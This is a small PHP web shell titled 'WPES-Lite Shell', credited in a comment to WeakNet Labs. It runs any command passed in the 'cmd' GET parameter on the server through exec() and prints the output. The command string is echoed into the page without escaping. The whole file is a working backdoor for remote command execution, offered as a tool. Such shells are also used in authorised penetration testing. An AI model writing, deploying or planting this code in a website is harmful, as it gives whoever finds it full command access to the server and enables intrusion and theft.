<!DOCTYPE html>
<html>
<head><title>WPES-Lite Shell</title></head>
<!-- 2018 WeakNet Labs, Douglas Berdeaux -->
<body>
<?php
 if(isset($_GET['cmd'])){
  echo "<h3>Host: ".gethostname()." - Command: ".$_GET['cmd']."</h3>";
  exec($_GET['cmd'],$result);
  foreach($result as $line){
   $lineParse=str_replace("<","&lt;",$line); # remove <
   $lineParse=str_replace(">","&gt;",$lineParse); # remove >
   echo $lineParse."<br />";
  }
 }else{
  echo "?cmd=^CMD^ in GET request, please.";
 }
?>
</body>
</html>
